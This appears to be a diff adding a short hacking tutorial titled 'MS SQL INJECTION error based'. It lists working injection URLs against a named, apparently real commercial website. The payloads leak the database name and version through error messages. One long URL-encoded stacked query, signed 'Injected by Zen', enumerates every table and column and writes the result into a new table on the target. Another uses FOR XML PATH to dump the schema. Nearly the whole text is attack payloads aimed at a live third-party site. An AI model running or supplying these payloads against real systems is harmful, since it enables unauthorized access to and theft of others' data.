@@ -1,0 +1,27 @@
+
+
+
+
+
+                                                     MS SQL INJECTION error based
+													 
+													 
+													 
+http://www.timescanindia.in/Product.aspx?Id=7 and 1=db_name()--
+Boom we got the error, and yeah the output also contains database name alongwith it.
+Conversion failed when converting the nvarchar value 'timescanindia' to data type int
+
+
+http://www.timescanindia.in/Product.aspx?Id=7 and @@version=1--
+Again we got an error as well as the output with the error: 													 
+
+
+
+
+http://www.timescanindia.in/Product.aspx?Id=7;BEGIN%20DECLARE%20@data%20VARCHAR%288000%29,%20@counter%20int,%20@tblName%20VARCHAR%2850%29,%20@colNames%20VARCHAR%28100%29%20DECLARE%20@tmpTbl%20TABLE%20%28name%20VARCHAR%288000%29%20NOT%20NULL%29%20SET%20@counter%20=%201%20SET%20@data=%27a%27%2bchar%2810%29%2b%27Injected%20by%20Zen%20::%20%27%2b%27char%2810%29%27%2b@@version%2b%27Database%20::%20%27%2bdb_name%28%29%2bchar%2810%29%2bchar%2810%29%20SET%20@tblName%20=%20%27%27%20SET%20@colNames%20=%20%27%27%20WHILE%20@counter%3C=%28SELECT%20COUNT%28table_name%29%20FROM%20INFORMATION_SCHEMA.TABLES%29%20BEGIN%20SET%20@colNames%20=%20%27%27%20SELECT%20@tblName%20=%20table_name%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20TABLE_NAME%20NOT%20IN%20%28select%20name%20from%20@tmpTbl%29%20SELECT%20@colNames%20=%20@colNames%20%2b%27%20:%20%27%2bcolumn_name%20%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME%20=%20@tblName%20INSERT%20@tmpTbl%20VALUES%28@tblName%29%20SET%20@data=@data%2b%27Table%20:%20%27%2b@tblName%2bchar%2810%29%2b%27Columns%20:%27%2b@colNames%2bchar%2810%29%20SET%20@counter%20=%20@counter%20%2b%201%20END%20SELECT%20@data%20AS%20output%20INTO%20err_dios%20END--
+
+
+http://www.timescanindia.in/Product.aspx?Id=7 and 1=(select+table_name%2b'::'%2bcolumn_name as t+from+information_schema.columns FOR XML PATH(''))--
+
+
+
